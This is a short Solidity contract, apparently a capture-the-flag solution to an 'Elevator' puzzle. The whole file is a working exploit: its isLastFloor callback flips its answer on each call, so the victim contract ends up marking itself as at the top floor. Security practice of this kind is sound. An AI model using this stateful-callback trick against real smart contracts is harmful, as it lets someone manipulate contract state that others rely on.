// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/11-IElevator.sol";

contract ElevatorAttack {
    IElevator public immutable victimElevator;
    bool private _isLastFloor = true;

    constructor(IElevator victimElevator_) {
        victimElevator = victimElevator_;
    }

    function isLastFloor(uint256) external returns (bool isLastFloor_) {
        isLastFloor_ = _isLastFloor = !_isLastFloor;
    }

    function attack() external {
        victimElevator.goTo(1);

        require(
            victimElevator.top() && 1 == victimElevator.floor(),
            "Elevator: Attack failed"
        );
    }
}
